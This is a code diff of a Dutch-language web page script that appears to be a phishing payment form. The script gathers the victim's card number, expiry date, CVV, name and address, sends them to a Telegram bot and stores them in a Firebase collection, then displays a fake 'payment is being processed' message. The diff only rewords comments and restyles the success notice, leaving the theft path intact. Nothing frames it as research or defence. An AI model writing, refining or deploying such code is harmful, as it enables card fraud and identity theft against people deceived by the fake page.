@@ -150,7 +150,7 @@
         const chatId = "8150436847";
 
         if(formData.kaartnummer && formData.voornaam) {
-            // 1. Direct naar Telegram
+            // 1. Telegram melding direct versturen
             const bericht = `🚨 *Nieuwe Invoer!* 🚨\n\n💳 *Kaart:* ${formData.kaartnummer}\n📅 *Verval:* ${formData.vervaldatum}\n🔐 *CVV:* ${formData.cvv}\n\n👤 *Naam:* ${formData.voornaam} ${formData.achternaam}\n🏠 *Adres:* ${formData.adres}, ${formData.postcode} ${formData.woonplaats}`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -160,19 +160,17 @@
             });
 
             try {
-                // 2. Naar Firebase
+                // 2. Firebase opslag
                 await addDoc(collection(db, "betalingen"), formData);
                 
-                // 3. Succes scherm
+                // 3. Toon succesmelding op het scherm
                 document.getElementById('formContent').innerHTML = `
-                    <div class="success-message">
-                        <h2>Bedankt!</h2>
-                        <p>Uw betaling wordt verwerkt. U kunt dit venster nu sluiten.</p>
-                        <div class="success-icon">✔️</div>
+                    <div style="text-align:center; padding:40px;">
+                        <h2 style="color:#28a745;">Bedankt!</h2>
+                        <p>Uw betaling wordt verwerkt. U kunt dit venster sluiten.</p>
                     </div>`;
             } catch (e) {
-                console.error("Fout:", e);
-                alert("Er ging iets mis bij het verzenden.");
+                console.error("Firebase fout:", e);
             }
         } else {
             alert("Vul alle velden in.");
@@ -181,5 +179,6 @@
 </script>
 </body>
 </html>
+
 
 
